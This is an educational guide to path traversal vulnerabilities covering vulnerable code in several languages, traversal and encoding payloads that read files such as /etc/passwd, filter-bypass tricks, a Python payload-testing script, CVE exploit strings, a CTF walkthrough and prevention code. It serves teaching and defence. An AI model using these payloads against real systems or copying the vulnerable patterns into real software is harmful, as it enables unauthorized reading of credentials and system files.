---
title: Path Traversal Vulnerabilities - Comprehensive  Guide
date: 2025-11-29
category: guides
tags:
  - web
  - path-traversal
---

## 1. What is Path Traversal?

Path traversal (also known as directory traversal) is a security vulnerability that allows an attacker to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with "dot-dot-slash (../)" sequences and its variations, or by using absolute file paths, an attacker may be able to read arbitrary files on the server, including:

- Application code and data
- Credentials for back-end systems
- Sensitive operating system files
- Configuration files containing secrets

In some cases, an attacker might be able to write to arbitrary files on the server, allowing them to:
- Modify application data or behavior
- Take full control of the server
- Plant backdoors or malware

## 2. How Path Traversal Works

### Basic Mechanism

Path traversal attacks work by exploiting insufficient validation of user-supplied input when constructing file paths. Here's a basic example:

```html
<!-- Vulnerable HTML -->
<img src="/loadImage?filename=218.png">
```

If the application constructs the file path by simply concatenating the base directory with the user input:

```javascript
// Vulnerable server-side code
const basePath = '/var/www/images/';
const filename = req.query.filename; // User input
const filePath = basePath + filename;
```

An attacker can manipulate the `filename` parameter to traverse directories:

```
https://example.com/loadImage?filename=../../../etc/passwd
```

This results in the application reading from:
```
/var/www/images/../../../etc/passwd
```

Which resolves to:
```
/etc/passwd
```

### Directory Traversal Sequences

- `../` - Move up one directory level (Unix/Linux)
- `..\` - Move up one directory level (Windows)
- `....//` - Nested traversal sequence
- `....\/` - Mixed slash traversal sequence

## 3. Common Scenarios for Path Traversal

### File Inclusion Operations
```php
// Vulnerable PHP code
include($_GET['page'] . '.php');
```

### File Reading Operations
```java
// Vulnerable Java code
String filename = request.getParameter("filename");
FileInputStream fis = new FileInputStream("/var/www/images/" + filename);
```

### File Upload Operations
```python
# Vulnerable Python code
filename = request.POST['filename']
filepath = os.path.join(UPLOAD_DIR, filename)
save_file(request.FILES['file'], filepath)
```

### Template Rendering
```ruby
# Vulnerable Ruby code
template = params[:template]
render template: "templates/#{template}"
```

### Configuration File Loading
```csharp
// Vulnerable C# code
string configFile = Request.QueryString["config"];
XmlDocument doc = new XmlDocument();
doc.Load("/app/config/" + configFile);
```

## 4. Exploitation Techniques

### Basic Path Traversal
```
../../../etc/passwd
```

### Windows Path Traversal
```
..\..\..\windows\win.ini
```

### URL Encoding
```
%2e%2e%2f (URL-encoded ../)
%252e%252e%252f (Double URL-encoded ../)
```

### Non-Standard Encodings
```
..%c0%af
..%ef%bc%8f
```

### Null Byte Injection
```
../../../etc/passwd%00.png
```

### Absolute Path
```
/etc/passwd
```

### Nested Traversal Sequences
```
....//....//....//etc/passwd
```

## 5. Bypassing Defenses

### 1. Stripping Directory Traversal Sequences

**Defense:** Application strips "../" from user input

**Bypass:** Use nested traversal sequences:
```
....//etc/passwd
```

When the application strips extra dots:
```
Input: ....//etc/passwd
After filter: ../etc/passwd
```

### 2. URL Path Sanitization

**Defense:** Web server strips directory traversal sequences from URL paths

**Bypass:** Use URL encoding:
```
..%2F..%2F..%2Fetc%2Fpasswd
```

Or double URL encoding:
```
..%252F..%252F..%252Fetc%252Fpasswd
```

### 3. Base Folder Requirement

**Defense:** Application requires filename to start with expected base folder

**Bypass:** Include the required base folder followed by traversal sequences:
```
/var/www/images/../../../etc/passwd
```

### 4. File Extension Requirement

**Defense:** Application requires filename to end with expected extension

**Bypass:** Use null byte to terminate the file path:
```
../../../etc/passwd%00.png
```

### 5. Unicode Normalization

**Defense:** Application normalizes Unicode characters

**Bypass:** Use Unicode characters that normalize to traversal sequences:
```
..%u2215%u2215%u2215etc%u2215passwd
```

## 6. Vulnerable Code Examples

### PHP Example
```php
<?php
// Vulnerable code
$file = $_GET['file'];
include("/var/www/html/" . $file);
?>
```

### Java Example
```java
// Vulnerable code
String filename = request.getParameter("filename");
FileInputStream fis = new FileInputStream("/app/uploads/" + filename);
```

### Node.js Example
```javascript
// Vulnerable code
app.get('/file', (req, res) => {
  const filename = req.query.name;
  const filePath = path.join(__dirname, 'files', filename);
  res.sendFile(filePath);
});
```

### Python Example
```python
# Vulnerable code
from flask import Flask, request, send_file

app = Flask(__name__)

@app.route('/download')
def download():
    filename = request.args.get('filename')
    return send_file('static/' + filename)
```

### C# Example
```csharp
// Vulnerable code
string fileName = Request.QueryString["file"];
string filePath = Path.Combine(Server.MapPath("~/Files"), fileName);
Response.WriteFile(filePath);
```

## 7. Prevention Strategies

### 1. Avoid User Input in Filesystem APIs

**Best Practice:** Don't pass user-supplied input to filesystem functions.

**Example:**
```python
# Instead of this (vulnerable):
filename = request.GET['file']
open("uploads/" + filename)

# Use this (secure):
allowed_files = {
    "profile": "uploads/user_profile.png",
    "logo": "uploads/company_logo.png"
}
key = request.GET['file']
if key in allowed_files:
    open(allowed_files[key])
else:
    return "Invalid file"
```

### 2. Input Validation

**Whitelist Approach:**
```java
// Java example
String filename = request.getParameter("filename");
Set<String> allowedFiles = Set.of("image1.png", "image2.png", "image3.png");

if (allowedFiles.contains(filename)) {
    // Process file
} else {
    // Reject request
}
```

**Character Validation:**
```python
# Python example
import re

def is_valid_filename(filename):
    # Only allow alphanumeric characters, dots, hyphens, and underscores
    return re.match(r'^[a-zA-Z0-9._-]+$', filename) is not None

if is_valid_filename(user_input):
    # Process file
else:
    # Reject request
```

### 3. Path Canonicalization and Verification

**Java Example:**
```java
File file = new File(BASE_DIRECTORY, userInput);
if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
    // Process file
}
```

**Python Example:**
```python
import os

def is_safe_path(base_dir, user_path):
    # Join the base directory with the user path
    full_path = os.path.join(base_dir, user_path)
    # Get the canonical (absolute) path
    canonical_path = os.path.realpath(full_path)
    # Check if the canonical path starts with the base directory
    return canonical_path.startswith(os.path.realpath(base_dir))

if is_safe_path("/var/www/images", user_input):
    # Process file
else:
    # Reject request
```

**Node.js Example:**
```javascript
const path = require('path');

function isSafePath(baseDir, userPath) {
    // Resolve the user input against the base directory
    const resolvedPath = path.resolve(baseDir, userPath);
    // Check if the resolved path is within the base directory
    return resolvedPath.startsWith(path.resolve(baseDir));
}

if (isSafePath(__dirname + '/uploads', req.query.filename)) {
    // Process file
} else {
    // Reject request
}
```

### 4. Use Indirect References

**Database Approach:**
```sql
-- Store file metadata in a database
CREATE TABLE files (
    id INT PRIMARY KEY,
    filename VARCHAR(255),
    filepath VARCHAR(255),
    -- Other metadata
    is_public BOOLEAN DEFAULT FALSE
);

-- Application retrieves file path from database
SELECT filepath FROM files WHERE id = ? AND is_public = TRUE;
```

**Mapping Approach:**
```python
# Python example
file_mapping = {
    "1": "documents/report.pdf",
    "2": "images/logo.png",
    "3": "data/stats.csv"
}

file_id = request.GET.get('id')
if file_id in file_mapping:
    filepath = os.path.join(SECURE_DIR, file_mapping[file_id])
    # Process file
else:
    # Reject request
```

### 5. Implement Least Privilege

- Run web applications with minimal privileges
- Use chroot jails or containers to isolate applications
- Restrict file system access to only necessary directories

### 6. Use Secure Framework Functions

Many modern frameworks provide built-in protection against path traversal:

**Laravel (PHP):**
```php
// Use Laravel's built-in functions
$path = storage_path('app/' . $filename);
if (Storage::exists($filename)) {
    return Storage::download($filename);
}
```

**Django (Python):**
```python
# Use Django's secure file handling
from django.core.files.storage import default_storage

if default_storage.exists(filename):
    return HttpResponse(default_storage.open(filename).read())
```

## 8. Detection Methods

### 1. Automated Scanning

**Burp Suite:**
- Use Burp Scanner to detect path traversal vulnerabilities
- Burp Intruder with predefined payload list "Fuzzing - path traversal"

**OWASP ZAP:**
- Active scanning mode can detect path traversal vulnerabilities
- Fuzzing with path traversal payloads

**Nikto:**
```bash
nikto -h http://example.com
```

### 2. Manual Testing

**Basic Testing:**
```
https://example.com/page?file=../../../../etc/passwd
```

**Windows Testing:**
```
https://example.com/page?file=..\..\..\..\windows\win.ini
```

**URL Encoding:**
```
https://example.com/page?file=..%2F..%2F..%2Fetc%2Fpasswd
```

**Null Byte Injection:**
```
https://example.com/page?file=../../../etc/passwd%00.jpg
```

### 3. Code Review

Look for patterns where user input is used in file operations:
- File inclusion functions
- File reading/writing operations
- File path construction

## 9. Tools for Testing

### 1. Burp Suite
- Intruder for automated fuzzing
- Scanner for automated detection
- Repeater for manual testing

### 2. OWASP ZAP
- Fuzzer for automated testing
- Active scanner for detection

### 3. Kali Linux Tools
- Dirb
- Dirbuster
- Gobuster

### 4. Custom Scripts
```python
# Python script for path traversal testing
import requests
import sys

def test_path_traversal(url, param):
    payloads = [
        "../../../etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        "....//....//....//etc/passwd",
        "/etc/passwd"
    ]
    
    for payload in payloads:
        params = {param: payload}
        response = requests.get(url, params=params)
        
        if "root:x:0:0" in response.text or "[fonts]" in response.text:
            print(f"Potential vulnerability found with payload: {payload}")
            return True
    
    return False

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python path_traversal_test.py <url> <parameter>")
        sys.exit(1)
    
    url = sys.argv[1]
    param = sys.argv[2]
    test_path_traversal(url, param)
```

## 10. Real-World Examples

### 1. CVE-2021-41773 (Apache 2.4.49)
- Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.49
- Allowed attackers to map URLs to files outside the configured directories
- Exploited using:
```
/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

### 2. CVE-2020-8193 (Citrix ADC)
- Path traversal vulnerability in Citrix Application Delivery Controller
- Allowed unauthenticated attackers to read arbitrary files
- Exploited using:
```
/vpn/../vpns/portal/scripts/newbm.pl
```

### 3. CVE-2019-5418 (Rails)
- Path traversal vulnerability in Rails Action View
- Allowed attackers to render arbitrary files
- Exploited using specially crafted Accept headers

## 11. Related Vulnerabilities

### 1. Local File Inclusion (LFI)
- Similar to path traversal but focuses on including local files
- Often leads to Remote Code Execution (RCE)

### 2. Remote File Inclusion (RFI)
- Including remote files that can execute code
- More dangerous than LFI

### 3. Directory Listing
- Exposing directory contents when directory listing is enabled

### 4. Insecure Direct Object Reference (IDOR)
- Accessing objects by manipulating direct references

## 12. CTF Challenges

### Common Challenge Types

1. **Basic Path Traversal**
   - Simple file reading using `../` sequences
   - Example: `?file=../../../../etc/passwd`

2. **Filtered Path Traversal**
   - Application filters certain characters or sequences
   - Requires bypassing filters using encoding or nested sequences

3. **Null Byte Injection**
   - Application requires specific file extensions
   - Use null bytes to terminate the path before the extension

4. **Log Poisoning**
   - Injecting malicious content into log files
   - Including log files to execute code

5. **Blind Path Traversal**
   - No direct feedback about file content
   - Requires exfiltration techniques like out-of-band requests

### Example CTF Walkthrough

**Challenge:** Find the flag in a file on the server

**URL:** `https://challenge.example.com/image?filename=picture.jpg`

**Solution:**
1. Try basic path traversal:
   ```
   ?filename=../../../etc/passwd
   ```
   - No success, likely filtered

2. Try URL encoding:
   ```
   ?filename=..%2F..%2F..%2Fetc%2Fpasswd
   ```
   - No success, still filtered

3. Try double URL encoding:
   ```
   ?filename=..%252F..%252F..%252Fetc%252Fpasswd
   ```
   - Success! Now we can read files

4. Look for the flag:
   ```
   ?filename=..%252F..%252F..%252Fhome%252Fuser%252Fflag.txt
   ```
   - Flag found: `CTF{path_traversal_master}`

## 13. Interview Questions

### Basic Questions

1. **What is path traversal?**
   - Answer: Path traversal is a security vulnerability that allows an attacker to access files and directories outside the intended directory.

2. **What are the common indicators of path traversal vulnerabilities?**
   - Answer: URL parameters that reference files, file inclusion functions, and file operations using user input.

3. **How can you prevent path traversal attacks?**
   - Answer: Input validation, path canonicalization, avoiding user input in filesystem operations, using indirect references, and implementing least privilege.

### Intermediate Questions

1. **How would you bypass a filter that removes "../" sequences?**
   - Answer: Use nested traversal sequences like "....//", URL encoding like "%2e%2e%2f", or double URL encoding like "%252e%252e%252f".

2. **What is null byte injection and how does it relate to path traversal?**
   - Answer: Null byte injection involves using a null byte (%00) to terminate a string before an unwanted extension, allowing attackers to bypass file extension checks.

3. **How would you detect path traversal vulnerabilities in a code review?**
   - Answer: Look for instances where user input is used in file operations without proper validation, such as file inclusion functions, file reading/writing operations, and file path construction.

### Advanced Questions

1. **How would you exploit a blind path traversal vulnerability where there's no direct feedback?**
   - Answer: Use techniques like exfiltrating data through out-of-band requests, timing attacks, or by writing to a location that can be accessed later.

2. **What is the difference between path traversal and local file inclusion (LFI)?**
   - Answer: Path traversal focuses on accessing files outside the intended directory, while LFI focuses on including and executing local files, often leading to code execution.

3. **How would you implement secure file handling in a web application?**
   - Answer: Use indirect references, validate input against a whitelist, canonicalize paths, implement least privilege, and use secure framework functions.

### Practical Questions

1. **Given this vulnerable code, how would you fix it?**
   ```php
   <?php
   $file = $_GET['file'];
   include("/var/www/html/" . $file);
   ?>
   ```
   - Answer: Use a whitelist of allowed files, validate input, or use indirect references.

2. **How would you test for path traversal vulnerabilities in a black-box assessment?**
   - Answer: Use automated tools like Burp Suite or OWASP ZAP, manually test with various payloads, and try different encoding techniques.

3. **What would be the impact of a successful path traversal attack on a web application?**
   - Answer: Impact could include reading sensitive files like configuration files with credentials, source code analysis for further vulnerabilities, or potentially writing files to achieve remote code execution.
